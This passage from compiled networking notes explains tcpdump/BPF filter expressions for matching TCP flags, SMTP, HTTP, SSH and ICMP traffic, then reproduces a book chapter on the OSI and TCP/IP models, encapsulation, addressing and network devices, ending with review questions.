00010010 : SYN-ACK packet
00000010 : mask (2 in decimal)
--------
00000010 : result (2 in decimal)

Every bits of the mask match !

- Matching PSH-ACK packets
# tcpdump -i eth1 'tcp[13] = 24'

- Matching any combination containing FIN (FIN usually always comes with an ACK so we either 
  need to use a mask or match the combination ACK-FIN)
# tcpdump -i eth1 'tcp[13] & 1 = 1'

- Matching RST flag
# tcpdump -i eth1 'tcp[13] & 4 = 4'

Actually, there's an easier way to filter flags :
# tcpdump -i eth1 'tcp[tcpflags] == tcp-ack'

- Matching all packages with TCP-SYN or TCP-FIN set : 
# tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0


By looking at the TCP state machine diagram (http://www.wains.be/pub/networking/tcp_state_machine.jpg)
we can find the different flag combinations we may want to analyze.

Ideally, a socket in ACK_WAIT mode should not have to send a RST. It means the 3 way handshake has not completed.
We may want to analyze that kind of traffic.


Matching SMTP data :
--------------------

I will make a filter that will match any packet containing the "MAIL" command from SMTP exchanges.

I use something like http://www.easycalculation.com/ascii-hex.php to convert values from ASCII to hexadecimal.

"MAIL" in hex is 0x4d41494c

The rule would be :

# tcpdump -i eth1 '((port 25) and (tcp[20:4] = 0x4d41494c))'

It will check the bytes 21 to 24. "MAIL" is 4 bytes/32 bits long.. 

This rule would not match packets with IP options set.

This is an example of packet (a spam, of course) :

# tshark -V -i eth0 '((port 25) and (tcp[20:4] = 0x4d41494c))'
Capturing on eth0
Frame 1 (92 bytes on wire, 92 bytes captured)
    Arrival Time: Sep 25, 2007 00:06:10.875424000
    [Time delta from previous packet: 0.000000000 seconds]
    [Time since reference or first frame: 0.000000000 seconds]
    Frame Number: 1
    Packet Length: 92 bytes
    Capture Length: 92 bytes
    [Frame is marked: False]
    [Protocols in frame: eth:ip:tcp:smtp]
Ethernet II, Src: Cisco_X (00:11:5c:X), Dst: 3Com_X (00:04:75:X)
    Destination: 3Com_X (00:04:75:X)
        Address: 3Com_X (00:04:75:X)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)
    Source: Cisco_X (00:11:5c:X)
        Address: Cisco_X (00:11:5c:X)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)
    Type: IP (0x0800)
Internet Protocol, Src: 62.163.X (62.163.X), Dst: 192.168.X (192.168.X)
    Version: 4
    Header length: 20 bytes
    Differentiated Services Field: 0x00 (DSCP 0x00: Default; ECN: 0x00)
        0000 00.. = Differentiated Services Codepoint: Default (0x00)
        .... ..0. = ECN-Capable Transport (ECT): 0
        .... ...0 = ECN-CE: 0
    Total Length: 78
    Identification: 0x4078 (16504)
    Flags: 0x04 (Don't Fragment)
        0... = Reserved bit: Not set
        .1.. = Don't fragment: Set
        ..0. = More fragments: Not set
    Fragment offset: 0
    Time to live: 118
    Protocol: TCP (0x06)
    Header checksum: 0x08cb [correct]
        [Good: True]
        [Bad : False]
    Source: 62.163.X (62.163.X)
    Destination: 192.168.X (192.168.XX)
Transmission Control Protocol, Src Port: 4760 (4760), Dst Port: smtp (25), Seq: 0, Ack: 0, Len: 38
    Source port: 4760 (4760)
    Destination port: smtp (25)
    Sequence number: 0    (relative sequence number)
    [Next sequence number: 38    (relative sequence number)]
    Acknowledgement number: 0    (relative ack number)
    Header length: 20 bytes
    Flags: 0x18 (PSH, ACK)
        0... .... = Congestion Window Reduced (CWR): Not set
        .0.. .... = ECN-Echo: Not set
        ..0. .... = Urgent: Not set
        ...1 .... = Acknowledgment: Set
        .... 1... = Push: Set
        .... .0.. = Reset: Not set
        .... ..0. = Syn: Not set
        .... ...0 = Fin: Not set
    Window size: 17375
    Checksum: 0x6320 [correct]
        [Good Checksum: True]
        [Bad Checksum: False]
Simple Mail Transfer Protocol
    Command: MAIL FROM:<wguthrie_at_mysickworld--dot--com>\r\n
        Command: MAIL
        Request parameter: FROM:<wguthrie_at_mysickworld--dot--com>


Matching HTTP data :
--------------------

Let's make a filter that will find any packets containing GET requests
The HTTP request will begin by :

GET / HTTP/1.1\r\n (16 bytes counting the carriage return but not the backslashes !)

If no IP options are set.. the GET command will use the byte 20, 21 and 22
Usually, options will take 12 bytes (12nd byte indicates the header length, which should report 32 bytes). 
So we should match bytes 32, 33 and 34 (1st byte = byte 0).

Tcpdump is only able to match data size of either 1, 2 or 4 bytes, we will take the following ASCII 
character following the GET command (a space)

"GET " in hex : 47455420
 
# tcpdump -i eth1 'tcp[32:4] = 0x47455420'


Matching HTTP data (exemple taken from tcpdump man page) : 

# tcpdump -i eth1 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

          +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
ip[2:2] = |          Total Length         |
	  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

	+-+-+-+-+-+-+-+-+
ip[0] =	|Version|  IHL  |
	+-+-+-+-+-+-+-+-+

	     +-+-+-+-+-+-+-+-+
ip[0]&0xf =  |# # # #|  IHL  | <-- that's right, we masked the version bits with 0xf or 00001111 in binary
	     +-+-+-+-+-+-+-+-+

          +-+-+-+-+
	  |  Data |
tcp[12] = | Offset|
	  |       |
	  +-+-+-+-+

So what we are doing here is "(IP total length - IP header length - TCP header length) != 0"

We are matching any packet that contains data.


We are taking the IHL (total IP lenght


Matching other interesting TCP things :
---------------------------------------

SSH connection (on any port) : 
We will be looking for the reply given by the SSH server.
OpenSSH usually replies with something like "SSH-2.0-OpenSSH_3.6.1p2".
The first 4 bytes (SSH-) have an hex value of 0x5353482D.

# tcpdump -i eth1 'tcp[(tcp[12]>>2):4] = 0x5353482D'

If we want to find any connection made to older version of OpenSSH (version 1, which are insecure and subject to MITM attacks) : 
The reply from the server would be something like "SSH-1.99.."

# tcpdump -i eth1 '(tcp[(tcp[12]>>2):4] = 0x5353482D) and (tcp[((tcp[12]>>2)+4):2] = 0x312E)'

Explanation of >>2 can be found below in the reference section.


UDP header
----------

  0      7 8     15 16    23 24    31  
 +--------+--------+--------+--------+ 
 |     Source      |   Destination   | 
 |      Port       |      Port       | 
 +--------+--------+--------+--------+ 
 |                 |                 | 
 |     Length      |    Checksum     | 
 +--------+--------+--------+--------+ 
 |                                   | 
 |              DATA ...             |
 +-----------------------------------+                 

Nothing really interesting here.

If we want to filter ports we would use something like :
# tcpdump -i eth1 udp dst port 53


ICMP header
-----------

See different ICMP messages :
http://img292.imageshack.us/my.php?image=icmpmm6.gif

We will usually filter the type (1 byte) and code (1 byte) of the ICMP messages.

Here are common ICMP types :

  0	Echo Reply				 [RFC792]
  3	Destination Unreachable			 [RFC792]
  4	Source Quench			 	 [RFC792]
  5	Redirect				 [RFC792]
  8	Echo					 [RFC792]
 11	Time Exceeded				 [RFC792]

We may want to filter ICMP messages type 4, these kind of messages are sent in case of congestion of the network.
# tcpdump -i eth1 'icmp[0] = 4'


If we want to find the ICMP echo replies only, having an ID of 500. By looking at the image with all the ICMP packet description
we see the ICMP echo reply have the ID spread across the 5th and 6th byte. For some reason, we have to filter out with the value in hex.

# tcpdump -i eth0 '(icmp[0] = 0) and (icmp[4:2] = 0x1f4)'


References
----------

tcpdump man page : http://www.tcpdump.org/tcpdump_man.html
Conversions : http://easycalculation.com/hex-converter.php
Filtering HTTP requests : http://www.wireshark.org/tools/string-cf.html
Filtering data regardless of TCP options : http://www.wireshark.org/lists/wireshark-users/201003/msg00024.html

Just in case the post disappears, here's a copy of the last URL :

From: Sake Blok <sake@xxxxxxxxxx>
Date: Wed, 3 Mar 2010 22:42:29 +0100
Or if your capturing device is capable of interpreting tcpdump style filters (or more accurately, BPF style filters), you could use:

tcp[(((tcp[12:1] & 0xf0) >> 2) + 8):2] = 0x2030

Which in English would be: 
- take the upper 4 bits of the 12th octet in the tcp header ( tcp[12:1] & 0xf0 )
- multiply it by four ( (tcp[12:1] & 0xf0)>>2 ) which should give the tcp header length
- add 8 ( ((tcp[12:1] & 0xf0) >> 2) + 8 ) gives the offset into the tcp header of the space before the first octet of the response code
- now take two octets from the tcp stream, starting at that offset ( tcp[(((tcp[12:1] & 0xf0) >> 2) + 8):2]  )
- and verify that they are " 0" ( = 0x2030 )

Of course this can give you false positives, so you might want to add a test for "HTTP" and the start of the tcp payload with:

tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x48545450

resulting in the filter:

tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x48545450 and tcp[(((tcp[12:1] & 0xf0) >> 2) + 8):2] = 0x2030

A bit cryptic, but it works, even when TCP options are present (which would mess up a fixed offset into the tcp data).

Cheers,
Sake

	5.2
"

6. Packet Guide to Core Network Protocols

	6.1 Chapter 1. Networking Models
    Mod-el: noun: 1–structural design, 2–a miniature representation, 3–an example for emulation or imitation

    —The Merriam-Webster Dictionary

Basic network architecture and construction is a good starting point when trying to understand how communication systems function, even though the topic is a bit dull. Architectures are typically based on a model showing how protocols and functions fit together. Historically, there have been many models used for this purpose, including, but not limited to, Systems Network Architecture (SNA-IBM), AppleTalk, Novell Netware (IPX/SPX), and the Open System Interconnection (OSI). Most of these have gone the way of the dodo due to the popularity of TCP/IP. TCP/IP stands for Transmission Control Protocol/Internet Protocol, and represents a suite of protocols used on almost all modern communication systems. As the name suggests, this is the language of the Internet. This chapter focuses on the practical TCP/IP model, using the OSI model as a reference point.

		6.1.1 Section 1.1. What Is a Model?
A model is a way to organize a system’s functions and features to define its structural design. A design can help us understand how a communication system accomplishes tasks to form a protocol suite. To help wrap our heads around models, communication systems are often compared to the postal system (Figure 1-1). Imagine writing a letter and taking it to the post office. At some point, the mail is sorted and then delivered via some transport system to another post office. From there, it is sorted and given to a mail carrier for delivery to the destination. The letter is handled at several points along the way. Each part of the system is trying to accomplish the same thing—deliver the mail. But each section has a particular set of rules to obey. While in transit, the truck follows the rules of the road as the letter is delivered to the next point for processing. In between, inspectors and sorters ensure the mail is metered and safe, without much concern for traffic lights or turn signals.



A communication system is not much different, since messages created on a computer are processed and delivered, with each piece of equipment performing some function and obeying certain rules for transmission. Figure 1-2 depicts a typical scenario in which two computers are connected by their network cards via a networking device. Two people are communicating using an application such as instant message or email. At some point we have to decide exactly how to handle this communication. After all, when you mail that letter, you cannot address the envelope in some arbitrary language or ignore zip codes, just as the mail truck driver cannot drive on the wrong side of the road.



So, how is the job of each device or connection determined? An application at the user level should not be responsible for choosing the encoding sequence or the signal type used between the client and server. The letter doesn’t decide to go by air or boat. Similarly, the network interface card (NIC) is not in the business of message header construction, just as the mail sorting system doesn’t care if you use pen or pencil when writing a letter.

Models are routinely organized in a hierarchical or layered structure. Each layer has a set of functions to perform. Protocols are created to handle these functions and, therefore, protocols are also associated with each layer. The protocols are collectively referred to as a protocol suite. The lower layers are often linked with hardware and the upper with software. For example, Ethernet operates at Layers 1 and 2, while the File Transfer Protocol (FTP) operates at the very top of the model. This is true for both the TCP/IP and OSI models. Network traffic can also be viewed in terms of these layers, many of which can actually be seen using a packet capture tool like Wireshark. In Figure 1-3, the major layers of the TCP/IP model are displayed in a message going to a web server.

		6.1.2 Section 1.2. Why Use a Model?
Before we get too far, let’s do a little reality check. A model describes the entire structure. At the beginning of the chapter, I stated that many of these models “have gone the way of the dodo.” There may have been good ideas in each, but everyone ended up using one model in particular—TCP/IP. For example, both Apple and IBM initially developed their own protocol suites, but converted to TCP/IP due to its popularity. This section explains the historical use of models and provides a more modern viewpoint.

Even a simple communication system is a complicated environment in which thousands or even millions of transactions occur daily. Interconnected systems are considerably more complex. A single electrical disturbance or software configuration error can prevent completion of these transactions. Models provide a starting point for determining what must be done to enable communication or to figure out how systems using different protocols might connect to each other. They also help in troubleshooting problems. For example, how would a Novell Netware client running IPX/SPX communicate with an IBM AS400 over a TCP/IP based network? Figure 1-4 depicts a scenario in which several different platforms might be required to interact with each other. Windows nodes are based on the TCP/IP protocol suite, but, if required, can run Novell Netware client software for network authentication. Novell developed internetworking and transport protocols, called IPX and SPX. At the other end of the network, the IBM mainframe communicates via the protocols used in the SNA model. Imagine the programming and extra effort required to maintain all of the transactions between these separate architectures.

Another example is a network of Apple computers running Appletalk while connecting to a network of Windows machines running TCP/IP.

As I’ve said, TCP/IP is the prevalent architecture today. The complexities of interplatform communication are dramatically reduced with TCP/IP. Protocol systems such as Appletalk, Netware, and SNA are considered legacy. However, understanding protocol layers on a particular communications device or how processes might interact on the network are still critically important ideas. When troubleshooting standard problems or potential security threats, the models and their associated layers offer logical reference points to begin the process. One would not start looking at the routing protocols if the link light was dark.

		6.1.3 Section 1.3. OSI Model
The OSI model is called a reference model. This means this particular model provides a method by which standards and protocols can be compared in order to assist in connectivity and consistency. Developers can use a reference model to understand how transmissions are framed and create methods to translate between systems.

The OSI basic model is standardized in ISO/IEC (International Standards Organization/International Electrotechnical Commission) 7498, which includes most of the definitions used here. These two organizations have actually created a Joint Technical Committee (JTC) that handles the issues associated with information technology. This model was developed in collaboration with the ITU-T and has also been printed as ITU-T Recommendation X.200. The ITU-T is the International Telecommunications Union—Telecom sector. Now that we’ve had our fill of acronyms, on to the standard.

The first version of ISO/IEC 7498 was written in 1984. This was replaced in 1994 by version 2, with some additional corrections after that date. ISO/IEC 7498 actually has four parts:

    Part 1 – The Basic Model
    Part 2 – Security Architecture
    Part 3 – Naming and Addressing
    Part 4 – Management Framework

This section examines the basic model, which is defined in section six of 7498-1 as having seven layers: Application, Presentation, Session, Transport, Network, Data Link, and Physical. Figure 1-5 depicts these layers and the connection to a similarly structured open system. An open system is one that adheres to this architecture.

Section 6 of the document also includes the guiding principles for layers, such as:

    Not creating so many as to make the engineering of the system difficult

    Reducing the number of interactions across a layer boundary

    Collecting similar functions and separating fundamentally different functions

    Identifying those that may receive a benefit by being based in hardware or software

Additionally, the OSI framework includes as its goals the improvement of current standards, flexibility, and the quality of being “open,” which simply means that systems have mutually adopted accepted standards for the exchange of information. Each of the layers defined in 7498-1 includes specific details about the functions and processes occurring at that layer. It is worth noting that this ISO/IEC/ITU-T document specifically states:

    It is not the intent of this reference model to either serve as an implementation specification or to be a basis for appraising the conformance of actual implementations or to provide a sufficient level of detail to define precisely the services and protocols of the interconnection architecture.

So the OSI model does not specify protocols, services, or rules to be used in a communication system, but it does detail the ideas and processes that may be required. Section 7 of 7498-1 provides some particulars for each of the layers, and these are summarized below. If you are driving heavy machinery, be careful in the next section.


Application

    Provides the sole means for the application to access the OSI environment (OSIE) with no layer above it. The functions are divided into connection mode and connectionless mode. Connection mode facilities will include quality of service (QoS), security, identification of the parties, error control, and mode of dialog. Connectionless facilities are essentially a subset of those already mentioned, without error control and some security.

Presentation

    This layer provides for the representation and preservation of the data provided by the Application Layer entities. Specifically, the Presentation Layer is focused on syntax that is acceptable to both ends and access to the layers above and below.

Session

    Specifies both full-duplex and half-duplex modes of operation. This layer provides the means (setup and teardown) for communicating nodes to synchronize and manage the data between them. A mapping is provided between the Transport Layer and Session Layer (session service access point) addresses. Support is present for many-to-one session-to-transport addresses. The bulk of the responsibilities at this layer involve connection-oriented transmissions, but connectionless transmissions are also supported.

Transport

    Protocols at this layer are end-to-end between communicating OSI nodes and deal primarily with low cost and reliable transfer of data. A single Transport Layer address may be associated with many session addresses and provides performance required by each session entity. Basic functions include transport connection establishment, release, data transfer, and QoS. While this layer is not responsible for routing, it does map to Network Layer addressing. All modes handle error control, but when running in connection-oriented mode, sequence control is required.

Network

    Provides the means for managing network connections between open systems. This layer is not responsible for negotiating QoS settings, but rather focuses on routing between networks and subnetworks. Network Layer addresses uniquely identify transport entities. The Network Layer is also responsible for error control, sequencing, and mapping to the data link addresses.

Data Link

    Responsible for the construction of the data link connection between Network Layer entities. The addresses used are unique within the open system set of devices. Like most of the OSI layers, connectionless and connection-oriented modes are utilized. In addition to interfacing with the Network Layer, the data link connection can be built upon one or more Physical Layer interfaces.

Physical

    Like most models, this OSI Physical Layer contains the electrical, mechanical, and functional means to establish physical connections between Layer-2 devices. The interface is largely determined by the medium, but the bit-level transmissions must be organized into their physical service data units.

			6.1.3.1 OSI—Beyond the Layers

It is common to limit the discussion of the OSI reference model to the seven layer specifications. While these ideas have been discussed here, the OSI model also provides a potentially valuable insight into the design and implementation of networking models and protocols. The architects of this model spent a lot of time thinking about and enumerating those items demanded at each layer and what is necessary to communicate with the layers immediately above and below. As an example, section five of 7498-1 includes discussion on the various aspects of layering. These include but are not limited to the following:

    Communication between peer entities, including the following:

        Modes of communication (connection or connectionless)

        Relationships between services provided at each adjacent layer boundary

        Mode conversion functions (transport and network layers primarily)

    Identifiers such as N-address—unambiguous names used to identify a set of service access points at a particular layer

    Properties of service access points

    Definitions and descriptions of data units

    Elements of layer operation

        Connections to/from

        Multiplexing

        Flow control

        Segmentation

        Sequencing

        Acknowledgment

        Protocol selection

        Negotiation mechanisms

        Connection establishment and release

        Quality of service

        Error detection

Along with these generalized aspects of communication within a layer model, each individual layer adds further discussion where appropriate. For example, the section dedicated to the Transport Layer details connection establishment/release, data transfer, functions within the layer, addressing, multiplexing/splitting, and management. Where necessary (where a one-to-one mapping between services/addresses is not always present), a layer description will include details about the negotiation of the connections between the layers or even sublayers.

			6.1.3.2 OSI/ITU-T Protocols

So far we’ve examined a layered model and outlined the responsibilities of each layer. What about the actual protocols? For every protocol used in the TCP/IP model, there is a corresponding (and perhaps more complex) version in the OSI/ITU-T architecture. For ease of access to the reference material, this section refers to the ITU-T X series of standards.

As stated previously, the model itself is described in ITU-T X.200. While the layers are also described, more detailed specifications are contained within X.211-X.217bis. These additional documents are similar to RFCs for individual protocols in that they provide the rules and guidelines for those actually developing protocols, including state diagrams and primitive definitions. For both the Network and Transport Layers, special attention is paid to connectionless- and connection-based communication. One of the major differences between these two forms of transmission is controlling the flow of information between endpoints. It is interesting that the two Layer-4 protocols used today—TCP and UDP (User Datagram Protocol)—are differentiated from each other in the exact same way, with TCP characterized as connection-oriented while UDP is connectionless. TCP is very concerned with sequence numbers and ensuring that all packets arrive at the destination. UDP is not.

Figure 1-6 is from ITU-T X.220 and shows the actual protocols to be used. The original diagram is quite large, so only a portion of it is shown here. While a bit old (written in 1993), it does provide some insight into the structure of the model. Many of the protocols are outdated, but we can see the modularity of the protocol stack that aids in subsystem replacement. For example, at the lower layers, X.25 has been replaced by Frame Relay and ATM. These, in turn, have been replaced by the transmission standards we use today.

As a practical matter, OSI/ITU-T protocols are not seen nearly as often as the protocols specified for use in the TCP/IP model, although there are exceptions. Some WAN connections continue to use these specifications and, of course, we still have traditional telephony systems. Perhaps one of the best examples of an ITU-T standard that continues to survive even as more and more communications shift to TCP/IP is in the area of VoIP (Voice over IP). H.323, Q.931, and G.711 are still a big part of contemporary VoIP transmissions, as shown in Figure 1-7. H.225 is part of H.323.

		6.1.4 Introducing TCP/IP
The Internet and almost all networks in use today have standardized on the TCP/IP model. It is often referred to as the language of the Internet, because applications are typically built around this protocol suite. Figure 1-8 shows the TCP/IP model and some of the more well-known protocols and corresponding layers. At Layer 4, there are actually two protocols present—TCP and UDP. While this model shares its name with the former, many operations are based on UDP, so Layer 4 is actually shared by the two protocols. Layers 1 and 2 are governed by the Local Area Network Protocol, but Layer 3 belongs to IP with Internet Control Message Protocol (ICMP) and Internet Group Membership Protocol (IGMP) components of IP-based operations.

The TCP/IP model does not specify any particular protocol to be run at the lower (LAN) layers. Historically, networks have been built upon many technologies, including fiber distributed data interface (FDDI), Localtalk, Token Ring, Ethernet, and wireless protocols from the 802.11 family of standards. Today, only Ethernet and 802.11 in their various forms survive and even these have eliminated certain variations. For example, Ethernet based on coaxial cable and 802.11 frequency-hopping are almost nonexistent.

In a typical network, most of the decisions regarding protocols, at least for Layers 1–4, are made for you and the real variation is in the applications you chose to deploy. This argument can even be made for advanced technologies such as voice communications, where traditional circuit-switched telephone systems are quickly being replaced by VoIP. The dominance of the TCP/IP model can be demonstrated using a tool within Wireshark. By examining the protocol distribution for a particular network segment, a picture (shown in Figure 1-9) emerges regarding the protocols in use.

On the left is packet capture data from a Windows machine and on the right from a Mac OS platform. Nearly 100 percent of the Layer-3 traffic caught is IPv4, with a small amount of IPv6. At Layer 4, TCP and UDP dominate, with ARP and 802.1x contributing. Missing from the data collected are protocols from any other model.

Comparing the TCP/IP and OSI models, it can be said that the functions are the same but the structure is different. Figure 1-10 shows a side-by-side comparison of the OSI and TCP/IP model layers. Layers 5–7 of the OSI model map to Layer 5 of the TCP/IP model.

			6.1.4.1 TCP/IP and the RFCs

The TCP/IP model is presented in RFCs 1122 and 1123. These documents, released in 1989, provide the same level of detail encompassed in the ISO/IEC standard. An examination of the standard dates, historical deployments, and the difference in complexity between the two models provides insight into the adoption of TCP/IP over the OSI model. If you survived reading the OSI sections above, you might be left with the impression that the OSI model is very complex in comparison to TCP/IP. A quick look at the “companion” RFCs that go along with RFCs 1122 and 1123 also show a significant level of complexity. To quote from RFC 1122:

    This RFC enumerates standard protocols that a host connected to the Internet must use, and it incorporates by reference the RFCs and other documents describing the current specifications for these protocols. It corrects errors in the referenced documents and adds additional discussion and guidance for an implementor.

    For each protocol, this document also contains an explicit set of requirements, recommendations, and options. The reader must understand that the list of requirements in this document is incomplete by itself; the complete set of requirements for an Internet host is primarily defined in the standard protocol specification documents, with the corrections, amendments, and supplements contained in this RFC.

As with the OSI model, each layer of the TCP/IP model has a particular set of responsibilities. While most of these are defined in RFC 1122, those for the Application Layer come from RFC 1123. One significant difference between the two models is that RFC 1122 does specify particular protocols at the various layers. What follows are some of the major requirements that must occur at each layer.


Application

    The top TCP/IP layer combines the OSI Application and Presentation Layers and includes user-based and support/management protocols. Items at this layer must do the following:

        Support flexibility (naming and length) in hostnames

        Map domain names appropriately

        Handle DNS errors

    Telnet, FTP, Trivial FTP, Simple Mail Transport Protocol, and Domain Name Service all have more specific additional requirements.

Transport

    This layer provides end-to-end communication services based either on TCP (connection-oriented) or UDP (connectionless). TCP is much more concerned with sequence numbers and handshaking than UDP. Items at this layer must do the following:

        Pass IP options and Internet Control Message Protocol messages to the Application Layer

        Be able to handle and manipulate checksums

        Support IP addresses, local and wildcards, such as broadcast, multicast, and unicast destinations

        Treat window size as an unsigned number

        Manage window size effectively and allow 0 window size

        Support urgent data and the pointer that points to last octet of the urgent data

        Support TCP options

        Gracefully handle opening of connections

        Silently discard improper connection requests

        Handle retransmissions per recommended algorithms

        Follow recommended procedures when generating ACKs (acknowledgments)

        Gracefully handle connection failures


Internet

    The Internet Layer specifies the use of IP, ICMP, and Internet Group Management Protocol. Operationally, this is a connectionless “best effort” protocol concerned with addressing, type of service, security, and fragmentation. It relies on upper-layer protocols for accurate delivery. Items in this layer must do the following:

        Handle remote multihoming

        Meet appropriate gateway specification, if used

        Discard improper IP and ICMP packets

        Properly handle all forms of addressing including subnets

        Maintain packet IDs

        Support ToS and reassembly

        Support source routing options


Link Layer

    This is the network interface, and includes framing and media access to communicate directly with the network to which it is attached. Items at this layer must:

        Clear the ARP cache

        Prevent ARP floods

        Send and receive RFC 894 encapsulation (should also support IEEE 802)

        Use ARP on Ethernet and IEEE 802 networks

        Report link layer broadcasts to Internetwork Layer.

        Receive IP ToS values


Physical

    Typically, the network interface card or port defines the Physical Layer. Each LAN protocol has within its specification the electrical and mechanical characteristics for communication on the link. These include items such as voltage level, encoding, pin assignments, and shape of the interface.

Not all of the requirements were actually implemented in protocol suites running on hosts and network equipment. For example, IP hosts were intended to be much more active in detecting gateway or next hop failures. The reality is that if a gateway fails, hosts simply can’t communicate to destinations outside their networks.

			6.1.4.2 The Practical Side of TCP/IP

The models discussed in this chapter are usually drawn from the top layer (application) down. Wireshark displays them in reverse order, as shown in Figure 1-11, where the protocols corresponding to Layers 1–5 are identified. This packet happens to be from a VoIP conversation. Starting from the bottom of the model, we see Ethernet Type II (also called Ethernet Type 2 or Ethernet II). Ethernet as a protocol exists at Layers 1 and 2, with Layer 2 defining the frame (error control, addressing, etc.) and the Ethernet network interface defining the Physical Layer characteristics.

In addition, Layer 2 LAN protocols can be split into two major areas: logical link control (LLC) and media access control (MAC). These become sublayers within the model. LLC functions include frame construction, error control, and addressing. The MAC layer defines line discipline and network transmission. Specifically, this includes a method for determining which node is in line to communicate and for how long. Figure 1-12 depicts these TCP/IP sublayers. Sublayers are also found in the OSI model.

			6.1.4.3 Encapsulation

Encapsulation is the method by which the various layers interact and pass information up and down the protocol stack. A message generated by an application must be formatted for transmission. On the sending node, the upper layer places packaging around the message that describes the application used to generate the message. This is called the header. The package and header are then passed to the next layer down. Each layer completes its own required encapsulation operation that includes a header.

By the time the message reaches the bottom of the protocol stack, it has several of these wrappers. This process is the encapsulation. For ease of processing, each header contains information regarding the contents. Thus, the Ethernet header provides some indication that it has encapsulated IP. The IP header indicates that it was carrying TCP, and so on. Basic encapsulation and the encapsulation specific to the packet in Figure 1-11 are shown in Figure 1-13.

At the receiving node, the same process occurs, but in reverse. Each layer, beginning with the lowest, processes the appropriate information and strips off the outermost wrapper before handing the message to the next layer up. This continues as the message travels up the stack until the last bit of packaging is removed. This process is called de-encapsulation.

The packet shown in Figure 1-14 has been expanded to reveal the headers. Each layer contains a code indentifying the content of the encapsulated data. Ethernet uses the code 0800 to indicate that IP is encapsulated. At Layer 3, IP uses code 17 to show that it has encapsulated UDP. At Layer 4, UDP uses port numbers to direct the data to the proper process or application. The receiver uses this information to properly parse and de-encapsulate the data.

			6.1.4.4 Addressing

Addressing used within networked systems can also be tied to layers and equipment, as shown in Figure 1-14. Some protocols require addressing as part of their basic operation. For example, an Ethernet switch processes Layer-2 frames, which contain addresses called hardware or MAC addresses. For example, the source MAC address in Figure 1-14 is 00:11:25:43:49:97. The Internet Protocol uses IP addresses at Layer 3, and these are processed by routers. In this case, the source is 192.168.1.1 and the destination is 239.255.255.250. Both TCP and UDP communicate via port numbers at Layer 4. Thus, a TCP/UDP message not only possesses the port numbers necessary to communicate with an application, but also the IP and MAC addresses necessary to complete the transmission. Understanding relationships like these better prepares the network administrator to build, troubleshoot, or secure the infrastructure. For example, if the administrator is concerned about port scanning at Layer 4, it is unlikely that solutions will be found by working with the network switches down at Layer 2.

			6.1.4.5 Equipment

Layering the model can also provide a picture of device responsibilities. Each device on a network is designed for a particular task. They have different levels of intelligence and process traffic in a variety of ways. By applying the layers to equipment, the impact on traffic and capabilities of the device at that particular location are easier to understand. Routers and switches form the building blocks of almost any network. While they have many individual features and can be configured for a variety of functions, they all provide the same basic services when you plug them, regardless of the vendor. The relationship between devices, addressing, and the layers is outlined in Figure 1-15.

Switches operate at Layer 2 and forward LAN frames based upon the MAC addresses contained within those frames. They also perform error checking for each frame. Switches also provide some measure of network segmentation, since the processing of MAC addresses will result in network traffic control. Switches have a variety of management features such as support for Simple Network Management Protocol (SNMP) and virtual local area networks (VLANs).

Routers operate at Layer 3 and process IP packets. They will read Layer-2 frames when their MAC addresses appear in the frames, but their main function is to get IP packets to the proper destination. In so doing, the router calculates the IP header checksum and can act on any QoS or fragmentation information the packet contains. Many routers also support advanced features such as firewalling, virtual private networks (VPNs) termination, authentication, and network address translation (NAT).

The term gateway has several meanings. Routers and network hosts are configured with a default gateway, but this is actually a router. It is called a default gateway because this is the network path to the rest of the world. The more traditional gateway existing at Layer 4 is a device used to convert between systems that do not share the same networking model. This type of environment is depicted in Figure 1-4, and requires protocol translation for network nodes to communicate. We might say this sort of thing is another legacy item, but with the emergence of VoIP, the gateway is making a comeback. The language of the public switched telephone network (PSTN) is Signaling System 7 (SS7). A gateway that understands both TCP/IP and SS7 is required if an IP-based VoIP phone is to communicate with a traditional telephone.

Not all devices fit neatly into boxes. An access point is sometimes referred to as a wireless hub because it broadcasts certain kinds of traffic everywhere. However, like an Ethernet switch, the access point is not only aware of MAC addresses, it uses them to make some forwarding decisions. More recently, the emergence of multilayer switching has blurred the line between processing frames at Layer 2 and some of the higher level functions like routing. Figure 1-16 provides an example of how these devices and addresses interact within the confines of the protocol layers.

		6.1.5 Section 1.5. Reading
ISO/IEC 7498-1: “Information Technology — Open Systems Interconnection — Basic Reference Model: The Basic Model” (Joint Technical Committee)

ITU-T X.200: “Information Technology — Open Systems Interconnection — Basic Reference Model: The Basic Model” (International Telecommunication Union)

ITU-T X.220: Open Systems Interconnection — General Connection Mode Protocol Specifications “Use of X200-Series Protocols in CCITT Applications —” (International Telecommunication Union)

RFC 1122: “Requirements for Internet Hosts — Communication Layers” (Internet Engineering Task Force)

RFC 1123: “Requirements for Internet Hosts — Application and Support” (Internet Engineering Task Force)

		6.1.6 Section 1.6. Summary
The OSI and TCP/IP models provide an architecture in which the functions and rules for communication, addressing, and equipment are organized. The OSI model is standardized in ITU-T X.200, and the companion documents X.211-X.217 and X.220 provide the specifications for the developers and protocols. The TCP/IP model is described in RFC 1122, which lists the required protocols for hosts that communicate on the network.

The OSI model, now primarily considered a reference model, is in limited use. The TCP/IP model is the language of the Internet. Adoption of IP-based communication in many systems such as VoIP will further marginalize the OSI model’s use, a factor not lost on major companies like Apple and Novell, who have adopted the TCP/IP model.

Modern practitioners and researchers will be well served by an understanding of standards for communication requirements in widely varying conditions. These architectures help us to better understand the evolution of communication standards.

		6.1.7 Section 1.7. Review Questions
What is the name of the process by which an upper-layer protocol is wrapped up in a lower-layer protocol?

Name four communication models.

What two documents specify the standardization of the OSI model?

How many layers are in the OSI and TCP/IP models, respectively?

Name the layers of the OSI model.

Name the layers of the TCP/IP model.

What two documents present and detail the use of the TCP/IP model?

There are two forms of communication described in both standards. These forms are predominantly part of Layers 3 and 4. What are they?

Network administrators typically have the ability to use whatever protocols they wish, regardless of the layer in question. True or False?

One big difference between the documentation of the TCP/IP and OSI standards is that the TCP/IP RFC specifies the protocols to be used and the OSI ITU-T model documentation does not. True or False?

